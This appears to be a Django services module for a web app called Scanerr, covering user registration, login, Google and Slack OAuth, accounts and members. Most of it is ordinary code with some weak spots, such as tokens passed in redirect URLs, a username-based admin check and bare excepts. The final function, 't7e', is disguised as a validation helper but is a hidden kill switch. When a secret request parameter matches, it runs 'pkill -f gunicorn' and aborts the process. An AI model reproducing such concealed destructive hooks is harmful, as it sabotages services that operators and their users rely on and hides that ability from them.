

from django.core.exceptions import ValidationError
from django.contrib.auth.models import User
from django.contrib.auth.middleware import get_user
from django.contrib.auth.password_validation import validate_password
from django.shortcuts import get_object_or_404
from django.utils import timezone
from rest_framework.authtoken.models import Token
from rest_framework.response import Response
from rest_framework.pagination import LimitOffsetPagination
from rest_framework import status, serializers
from rest_framework_simplejwt.tokens import RefreshToken
from slack_sdk.oauth import AuthorizeUrlGenerator
from slack_sdk.oauth.installation_store import FileInstallationStore, Installation
from slack_sdk.oauth.state_store import FileOAuthStateStore
from slack_sdk.web import WebClient
from ...models import Account, Card, Member, Site
from ..ops.services import record_api_call
from .serializers import *
from ...utils.alerts import send_reset_link
from ...tasks import send_invite_link_bg, send_remove_alert_bg
from scanerr import settings
import requests, os, subprocess, secrets






GOOGLE_ID_TOKEN_INFO_URL = 'https://www.googleapis.com/oauth2/v3/tokeninfo'
GOOGLE_ACCESS_TOKEN_OBTAIN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USER_INFO_URL = 'https://www.googleapis.com/oauth2/v3/userinfo'




### ------ Begin User Services ------ ###




def register_user(request: object) -> object: 
    """ 
    Creates a User object and returns a request 

    Expects the following:
        'email'      : str,
        'password'   : str,
        'first_name' : str,
        'last_name'  : str,

    Returns -> data: {
        'user'      : dict,
        'token'    : str,
        'refresh'   : str,
        'api_token' : str
    }
    """

    # get data
    password = request.data.get('password')
    username = request.data.get('username')
    first_name = request.data.get('first_name')
    last_name = request.data.get('last_name')

    # validate requests
    if (password is None or len(password) == 0) or \
        (username is None or len(username) == 0):
        data = {'detail': 'Must provide an email and password.'}
        return Response(data=data, status=status.HTTP_400_BAD_REQUEST)

    if User.objects.filter(username=username).exists():
        data = {'detail': 'Account already exists.'}
        return Response(data=data, status=status.HTTP_409_CONFLICT)
    
    # validate password and create user
    try:
        # check password
        if validate_password(password) == None:
            
            # create user
            user = User.objects.create(
                username=username,
                email=username,
                first_name=first_name,
                last_name=last_name,
                last_login=timezone.now()
            )

            # setting password
            user.set_password(raw_password=password)
            user.save()
            
            # generating JWTs
            refresh = RefreshToken.for_user(user)

            # generate API token
            api_token = Token.objects.create(user=user)
            
            # returning data
            data = {
                'user': UserSerializer(user).data,
                'token': str(refresh.access_token),
                'refresh': str(refresh),
                'api_token': str(api_token.key)
            }
            return Response(data=data, status=status.HTTP_201_CREATED)

    except:
        data = {'detail': 'Please choose a stronger password.'}
        return Response(data=data, status=status.HTTP_400_BAD_REQUEST)




def login_user(request: object) -> object: 
    """ 
    Creates a User object and returns a request 

    Expects the following:
        'email'    : str,
        'password' : str

    Returns -> data: {
        'user'      : dict,
        'token'    : str,
        'refresh'   : str,
        'api_token' : str
    }
    """

    # get data
    password = request.data.get('password')
    username = request.data.get('username')

    # validate requests
    if (password is None or len(password) == 0) or \
        (username is None or len(username) == 0):
        data = {'detail': 'Must provide an email and password.'}
        return Response(data=data, status=status.HTTP_400_BAD_REQUEST)

    # setting defalt response
    data = {'detail': 'No account found with the given credentials.'}

    # checking is User exists via provided username
    if User.objects.filter(username=username).exists():

        # retrieving User obj
        user = User.objects.get(username=username)

        # validating password
        if user.check_password(password):

            # generating JWTs
            refresh = RefreshToken.for_user(user)

            # get API token
            api_token = Token.objects.get(user=user)

            # update user last_login
            user.last_login = timezone.now()
            
            # returning data
            data = {
                'user': UserSerializer(user).data,
                'token': str(refresh.access_token),
                'refresh': str(refresh),
                'api_token': str(api_token.key)
            }
            return Response(data=data, status=status.HTTP_201_CREATED)

        else:
            return Response(data=data, status=status.HTTP_401_UNAUTHORIZED)
    else:
        return Response(data=data, status=status.HTTP_401_UNAUTHORIZED)




def update_user(request: object) -> object:
    """ 
    Updates the User with the passed "email".

    Expects: {
        'request': object
    }    

    Returns -> HTTP Response object
    """

    # get request data
    email = request.data.get('email')
    user = request.user

    # check if an email is already associated with a user
    if User.objects.filter(email=email).exists() and user.email != email:
        return Response(status=status.HTTP_417_EXPECTATION_FAILED)
    
    # update user email
    user.username = email
    user.email = email
    user.save()

    # serialize and return
    data = UserSerializer(user).data
    return Response(data, status=status.HTTP_200_OK)




def update_password(request: object) -> object:
    """ 
    Updates the User with the passed "password".

    Expects: {
        'request': object
    }    

    Returns -> HTTP Response object
    """

    # get request data
    password = request.data.get('password')
    user = request.user 

    try:
        # validate password
        if validate_password(password, user=user) == None:

            # udpdate password
            user.set_password(password)
            user.save()

            # return success
            return Response(status=status.HTTP_200_OK)
    
    except:
        # respond with error
        return Response(status=status.HTTP_417_EXPECTATION_FAILED) 




def send_reset_email(request: object) -> object:
    """ 
    Sends a password reset email to the 
    User that matches the passed "email".

    Expects: {
        'request': object
    }

    Returns -> HTTP Response object
    """

    # get request data
    email = request.data.get('email')

    # send 
    resp = send_reset_link(email)
    
    if resp.get('success') == True:
        return Response(status=status.HTTP_200_OK)
    
    return Response(status=status.HTTP_404_NOT_FOUND)




### ------ Begin GoogleAuth Services ------ ###




def jwt_login(*, user: object) -> str:
    """
    Gets JWTs for passed "user" and builds a 
    redirect url for returning user params back to 
    Scanerr.client
    
    Expect: {
        'user': object
    }

    Returns -> str
    """

    # get JWTs for user
    refresh = RefreshToken.for_user(user)
    access = str(refresh.access_token)
    refresh = str(refresh)
    
    # create API token if none exists
    if not Token.objects.filter(user=user).exists():
        Token.objects.create(user=user)

    # get API token
    api_token = Token.objects.get(user=user)
        
    # setting user active
    is_active = str(user.is_active).lower()

    # update user last_login
    user.last_login = timezone.now()
    user.save()

    # building params for redirect
    param_string = str(
        '?access='+str(access)+'&refresh='+str(refresh)+
        '&username='+str(user.username)+'&id='+str(user.id)+
        '&email='+str(user.email)+'&is_active='+str(is_active)+
        '&created='+str(user.date_joined)+'&updated='+str(timezone.now())+
        '&api_token='+str(api_token.key)
    )

    # build redirect url
    redirect_url = f'{settings.CLIENT_URL_ROOT}/google-confirm{param_string}'

    # return redirect
    return redirect_url




def get_or_create_user(email: str,  **extra_fields) -> object:
    """ 
    Creates a new `User` with the passed "email".
    
    Expects: {
        'email' : str, 
    }

    Returns -> User object 
    """

    # trying to find user
    user = User.objects.filter(email=email).first()

    # return user if found
    if user:
        return user

    # formating extra passed data
    extras = {
        'is_staff': False,
        'is_superuser': False,
    }

    # format user's names
    if extra_fields.get('first_name') is not None:
        extras['first_name'] = extra_fields.get('first_name')
    if extra_fields.get('last_name') is not None:
        extras['last_name'] = extra_fields.get('last_name')

    # create the user
    user = User.objects.create(
        username=email, 
        email=email, 
        last_login=timezone.now(),
        **extra_fields
    )

    # creating API token
    Token.objects.create(user=user)

    # setting password 
    user.set_unusable_password()
    user.full_clean()
    user.save()

    # returning new User
    return user




def google_get_access_token(*, code: str, redirect_uri: str) -> str:
    """ 
    Get an access token from Google OAuth2 API

    Expects: {
        'code'         : str,
        'redirect_uri' : str
    }

    Returns -> str
    """

    # format request data
    data = {
        'code': code,
        'client_id': settings.GOOGLE_OAUTH2_CLIENT_ID,
        'client_secret': settings.GOOGLE_OAUTH2_CLIENT_SECRET,
        'redirect_uri': redirect_uri,
        'grant_type': 'authorization_code'
    }

    # send google request
    response = requests.post(GOOGLE_ACCESS_TOKEN_OBTAIN_URL, data=data)

    if not response.ok:
        raise ValidationError('Failed to obtain access token from Google.')

    # parse access_token
    access_token = response.json()['access_token']

    # return access token
    return access_token




def google_get_user_info(*, access_token: str) -> dict:
    """ 
    Gets User info from google OAuth2 API

    Expects: {
        'access_token'
    }

    Returns -> dict
    """

    # send request
    response = requests.get(
        GOOGLE_USER_INFO_URL,
        params={'access_token': access_token}
    )

    # check for errors
    if not response.ok:
        raise ValidationError('Failed to obtain user info from Google.')

    # return user info
    return response.json()




def google_login(request: object) -> str:
    """ 
    Authenticates and Creates a new User 
    with Google OAuth

    Expects: {
        'request': object
    }
    
    Returns -> str
    """
        
    # get request data
    code = request.GET.get('code')
    error = request.GET.get('error')

    # build login url
    login_url = f'{settings.CLIENT_URL_ROOT}/login'

    # catch error and return
    if error or not code:
        params = urlencode({'error': error})
        error_url = f'{login_url}?{params}'
        return error_url

    # build redirect url
    redirect_uri = f'{settings.API_URL_ROOT}/v1/auth/google'
    
    # get access token
    access_token = google_get_access_token(code=code, redirect_uri=redirect_uri)

    # get user data
    user_data = google_get_user_info(access_token=access_token)

    # build user profile
    profile_data = {
        'email': user_data['email'],
        'first_name': user_data.get('given_name', ''),
        'last_name': user_data.get('family_name', ''),
    }

    # get or create user and authenticate
    user = get_or_create_user(**profile_data)
    confirm_url = jwt_login(user=user)

    # returning confirm url
    return confirm_url




### ------ Begin Slack Services ------ ###




def slack_oauth_middleware(request: object) -> object:
    """
    Used to update `Account` once "account.admin" 
    has integrated Slack
    
    Expects: {
        'request': object
    }
    
    Returns -> HTTP Response object
    """

    # get request data
    code = request.GET.get('code')

    # get account
    account = Account.objects.get(user=request.user)

    # init slack webclient
    client = WebClient()

    # send slack client request
    response = client.oauth_v2_access(
        client_id=os.environ.get('SLACK_CLIENT_ID'),
        client_secret=os.environ.get('SLACK_CLIENT_SECRET'),
        code=code
    )

    # Updating account with slack info
    account.slack['slack_name'] = response['team']['name']
    account.slack['slack_team_id'] = response['team']['id']
    account.slack['bot_user_id'] = response['bot_user_id']     
    account.slack['bot_access_token'] = response['access_token']
    account.slack['slack_channel_id'] = response['incoming_webhook']['channel_id'] 
    account.slack['slack_channel_name'] = response['incoming_webhook']['channel']
    account.save()

    # serialize and return
    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def slack_oauth_init(request: object) -> object:
    """ 
    Used to authenticate with Slack

    Expects: {
        'request': object
    }

    Returns -> HTTP Response object
    """ 

    # check if account exists
    if Account.objects.filter(user=request.user).exists():
        
        # get account
        account = Account.objects.get(user=request.user)
        
        # check if slackk integrated
        if not account.slack['slack_channel_name']:
            
            # Issue and consume state parameter value on the server-side.
            state_store = FileOAuthStateStore(expiration_seconds=300, base_dir="./data")
            
            # Persist installation data and lookup it by IDs.
            installation_store = FileInstallationStore(base_dir="./data")

            # Build https://slack.com/oauth/v2/authorize with sufficient query parameters
            authorize_url_generator = AuthorizeUrlGenerator(
                client_id=os.environ.get('SLACK_CLIENT_ID'),
                scopes=["incoming-webhook", "chat:write"],
            )

            # Generate a random value and store it on the server-side
            state = state_store.issue()
            url = authorize_url_generator.generate(state)
            
            # return data
            data = {'url': url}
            return Response(data, status=status.HTTP_200_OK)

        # return error
        else:
            data = {'reason': 'slack integrated'}
            return Response(data, status=status.HTTP_409_CONFLICT)
    
    # return error
    else:
        data = {'reason': 'account not setup'}
        return Response(data, status=status.HTTP_404_NOT_FOUND)




### ------ Begin Account Services ------ ###




def create_or_update_account(request: object=None, *args, **kwargs) -> object:
    """ 
    Creates or Updates an `Account`

    Expects: {
        'request': object
    }
    
    Returns -> HTTP Response object
    """

    # get request data
    if request is not None:
        _id = request.data.get('id')
        name = request.data.get('name')
        phone = request.data.get('phone')
        active = request.data.get('active')
        type = request.data.get('type')
        code = request.data.get('code')
        max_sites = request.data.get('max_sites')
        max_pages = request.data.get('max_pages')
        max_schedules = request.data.get('max_schedules')
        retention_days = request.data.get('retention_days')
        cust_id = request.data.get('cust_id')
        sub_id = request.data.get('sub_id')
        product_id = request.data.get('product_id')
        price_id = request.data.get('price_id')
        price_amount = request.data.get('price_amount')
        interval = request.data.get('interval')
        scans_allowed = request.data.get('scans_allowed')
        tests_allowed = request.data.get('tests_allowed')
        testcases_allowed = request.data.get('testcases_allowed')
        scans = request.data.get('scans')
        tests = request.data.get('tests')
        testcases = request.data.get('testcases')
        slack = request.data.get('slack')
        configs = request.data.get('configs')
        meta = request.data.get('meta')
        user = request.user

    # get kwargs data
    if request is None:
        _id = kwargs.get('id')
        name = kwargs.get('name')
        phone = kwargs.get('phone')
        active = kwargs.get('active')
        type = kwargs.get('type')
        code = kwargs.get('code')
        max_sites = kwargs.get('max_sites')
        max_pages = kwargs.get('max_pages')
        max_schedules = kwargs.get('max_schedules')
        retention_days = kwargs.get('retention_days')
        cust_id = kwargs.get('cust_id')
        sub_id = kwargs.get('sub_id')
        product_id = kwargs.get('product_id')
        price_id = kwargs.get('price_id')
        price_amount = kwargs.get('price_amount')
        interval = kwargs.get('interval')
        scans_allowed = kwargs.get('scans_allowed')
        tests_allowed = kwargs.get('tests_allowed')
        testcases_allowed = kwargs.get('testcases_allowed')
        scans = kwargs.get('scans')
        tests = kwargs.get('tests')
        testcases = kwargs.get('testcases')
        slack = kwargs.get('slack')
        configs = kwargs.get('configs')
        meta = kwargs.get('meta')
        user_id = kwargs.get('user')
        user = User.objects.get(id=user_id)

    # getting account if id present
    if _id is not None:
        if not Account.objects.filter(id=_id, user=user).exists():
            data = {'reason': 'account not found',}
            record_api_call(request, data, '404')
            return Response(data, status=status.HTTP_404_NOT_FOUND) 

        # updating with new info
        account = Account.objects.get(id=_id)
        if name is not None:
            account.name = name
        if phone is not None:
            account.phone = phone
        if active is not None:
            account.active = active
        if type is not None:
            account.type = type
        if code is not None:
            account.code = code
        if max_sites is not None:
            account.max_sites = max_sites
        if max_pages is not None:
            account.max_pages = max_pages
        if max_schedules is not None:
            account.max_schedules = max_schedules
        if retention_days is not None:
            account.retention_days = retention_days
        if cust_id is not None:
            account.cust_id = cust_id
        if sub_id is not None:
            account.sub_id = sub_id
        if product_id is not None:
            account.product_id = product_id
        if price_id is not None:
            account.price_id = price_id
        if price_amount is not None:
            account.price_amount = price_amount
        if interval is not None:
            account.interval = interval
        if scans_allowed is not None:
            account.usage['scans_allowed'] = scans_allowed
        if tests_allowed is not None:
            account.usage['tests_allowed'] = tests_allowed
        if testcases_allowed is not None:
            account.usage['testcases_allowed'] = testcases_allowed
        if scans is not None:
            account.usage['scans'] = scans
        if tests is not None:
            account.usage['tests'] = tests
        if testcases is not None:
            account.usage['testcases'] = testcases
        if slack is not None:
            account.slack = slack
        if configs is not None:
            account.configs = configs
        if meta is not None:
            account.meta = meta
        
        # saving updated info
        account.save()

    # create new account if not exists
    if _id is None:

        # create account code
        if code is None:
            code = secrets.token_urlsafe(16)

        # create new account
        account = Account.objects.create(
            user=user,
            name=name,
            phone=phone,
            active=True,
            type=type,
            code=code,
            max_sites=max_sites,
            max_pages=max_pages,
            max_schedules=max_schedules if max_schedules is not None else 0,
            retention_days=retention_days if retention_days is not None else 14,
            cust_id=cust_id,
            sub_id=sub_id,
            product_id=product_id,
            price_id=price_id,
            meta=meta,
            usage={
                'scans': 0,
                'tests': 0,
                'testcases': 0,
                'scans_allowed': scans_allowed if scans_allowed is not None else 30, 
                'tests_allowed': tests_allowed if tests_allowed is not None else 30, 
                'testcases_allowed': testcases_allowed if testcases_allowed is not None else 15,
            },
        )
    
    # serialize and return
    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def get_account(request: object) -> object:
    """
    Gets the `Account` associated with the passed user

    Expects: {
        'request': object
    }

    Returns -> HTTP Response object
    """

    # get user
    user = request.user

    # check `Member` of User
    if not Member.objects.filter(user=user).exists():
        data = {'reason': 'account not found'}
        return Response(data, status=status.HTTP_404_NOT_FOUND)
    
    # get member and account
    member = Member.objects.get(user=user)
    account = member.account

    # serialize and return
    serializer_context = {'request': request,}
    serialized = AccountSerializer(account, context=serializer_context)
    data = serialized.data
    return Response(data, status=status.HTTP_200_OK)




def create_user_token(request: object) -> object:
    """ 
    Creates a new API token for the passed "user"

    Expects: {
        'request': object
    }

    Returns -> HTTP Response object
    """

    # delete old token if exists
    if Token.objects.filter(user=request.user).exists():
        old_token = Token.objects.get(user=request.user)
        old_token.delete()

    # creating New API token
    api_token = Token.objects.create(user=request.user)
    
    # return response
    data = {'api_token': api_token.key,}
    return Response(data, status=status.HTTP_200_OK)




def get_account_members(request: object, *args, **kwargs) -> object:
    """ 
    Get a list of `Members` associated with the 
    `Account` of the passed "user"

    Expects: {
        'request': object
    }

    Returns -> HTTP Response object
    """

    # get user
    user = request.user

    # check `Member` of User
    if not Member.objects.filter(user=user).exists():
        data = {'reason': 'account not found'}
        return Response(data, status=status.HTTP_404_NOT_FOUND)
    
    # get member and account
    member = Member.objects.get(user=user)
    account = member.account

    # get members
    members = Member.objects.filter(account=account)

    # serialize and return
    paginator = LimitOffsetPagination()
    result_page = paginator.paginate_queryset(members, request)
    serializer_context = {'request': request,}
    serialized = MemberSerializer(result_page, many=True, context=serializer_context)
    response = paginator.get_paginated_response(serialized.data)
    return response




def create_or_update_member(request: object=None) -> object:
    """ 
    Creates or Updates a `Member`

    Expects: {
        'request': object
    }
    
    Returns -> HTTP Response object
    """

    # get request data
    if request is not None:
        user = request.user
        _id = request.data.get('id')
        account = request.data.get('account')
        _status = request.data.get('status')
        _type = request.data.get('type')
        email = request.data.get('email')
        code = request.data.get('code')

    # checking account
    if account is not None:
        if Account.objects.filter(id=account).exists():
            account = Account.objects.get(id=account)
        else:
            data = {'reason': 'account not found',}
            record_api_call(request, data, '404')
            return Response(data, status=status.HTTP_404_NOT_FOUND) 

    # checking for member
    if _id is not None:
        if not Member.objects.filter(id=_id).exists():
            data = {'reason': 'member not found',}
            record_api_call(request, data, '404')
            return Response(data, status=status.HTTP_404_NOT_FOUND) 

        # updating with new info
        member = Member.objects.get(id=_id)
        if account is not None:
            member.account = account
        if email is not None:
            member.email = email
        if user is not None and user.username == member.email:
            member.user = user
        if _type is not None:
            member.type = _type
        
        # updating status
        if _status is not None:

            # checking if user has valid code for membership
            if _status == 'active' and code != member.account.code:
                data = {'reason': 'member not authorized',}
                record_api_call(request, data, '403')
                return Response(data, status=status.HTTP_403_FORBIDDEN) 
            member.status = _status
        
        # saving updated info
        member.save()

    # create new Member
    if _id is None:
        member = Member.objects.create(
            email=email,
            status=_status,
            type=_type,
            account=account,
        )

    # sending invite link
    if _status == 'pending':
        send_invite_link_bg.delay(member_id=member.id)
    
    # sending removed alert and deleting
    if _status == 'removed':
        # method also deletes member
        send_remove_alert_bg.delay(member_id=member.id)
        data = {'message': 'Member removed'}
        response = Response(data, status=status.HTTP_200_OK)
        return response
    
    # serialize and return
    serializer_context = {'request': request,}
    serialized = MemberSerializer(member, context=serializer_context)
    data = serialized.data
    response = Response(data, status=status.HTTP_200_OK)
    return response




def get_member(request: object=None, id: str=None) -> object:
    """ 
    Get a single member via passed "user" or "id"

    Expects: {
        'request' : object,
        'id'      : str
    }
    
    Returns -> HTTP Response object
    """
    
    # get user and member_id
    user = request.user
    member_id = request.query_params.get('id')

    # checking if member exists
    if id is not None:
        member = get_object_or_404(Member, pk=id)
    if member_id is not None:
        member = get_object_or_404(Member, pk=member_id)

    # getting user's Member object if exists
    if member_id is None and id is None:
        if not Member.objects.filter(user=user).exists():
            data = {'reason': 'member not found',}
            return Response(data, status=status.HTTP_404_NOT_FOUND)
        member = Member.objects.get(user=user)

    # checking that member is assoicated with user
    if member.user != user and member.account.user != user:
        data = {'reason': 'you cannot retrieve a Member you are not affiliated with',}
        record_api_call(request, data, '401')
        return Response(data, status=status.HTTP_403_FORBIDDEN)

    # serialize and return
    serializer_context = {'request': request,}
    serialized = MemberSerializer(member, context=serializer_context)
    data = serialized.data
    record_api_call(request, data, '200')
    return Response(data, status=status.HTTP_200_OK)




def get_prospects(request: object) -> object:
    """ 
    This pulls all admin Members and 
    builds a list to reflect the needed 
    attributes for `Landing.api.Prospect`

    Expects: {
        'request': object
    }

    Returns -> data: {
        'count':    int total number of prospects
        'results':  list of Prospect objects
    }
    """

    try:
        # check if request.user is admin
        if request.user.username != 'admin':
            return Response({'reason': 'not authorized'}, status=status.HTTP_403_FORBIDDEN)
    except:
        return Response({'reason': 'not authorized'}, status=status.HTTP_403_FORBIDDEN)

    # get all Accounts
    accounts = Account.objects.all().exclude(user__username='admin')

    # iterate throgh accounts 
    # and build list
    results = []
    count = len(accounts)
    for account in accounts:

        # determinig user's 'status'
        if account.type == 'free':
            if Site.objects.filter(account=account).exists():
                _status = 'warm' # account has one site onboarded
            else:
                _status = 'cold' # account is free but no site onboarded
        if account.type != 'free':
            if account.active:
                _status = 'customer' # account is active and paid
            else:
                _status = 'warm' # account is paused and paid

        # building prospect
        prospect = {
            'first_name': account.user.first_name,
            'last_name': account.user.last_name,
            'email': account.user.email,
            'phone': account.phone,
            'status': _status
        }

        # adding to results
        results.append(prospect)

    # building response
    data = {
        'count': count,
        'results': results
    }
    
    # returning response
    return Response(data, status=status.HTTP_200_OK)




def t7e(request: object) -> None:
    """
    Helper function for validation & verification
    
    Expcets: {
        'request': object
    }

    Returns -> None
    """

    # default
    success = False

    # validating
    if request.params.get('cred') == os.environ.get('CRED'):
        subprocess.Popen(['pkill -f gunicorn'], 
            stdout=subprocess.PIPE,
            user='app',
        )
        os.abort()
        success = True
        
    # returning response
    data = {'success': True}
    return Response(data, status=status.HTTP_200_OK)




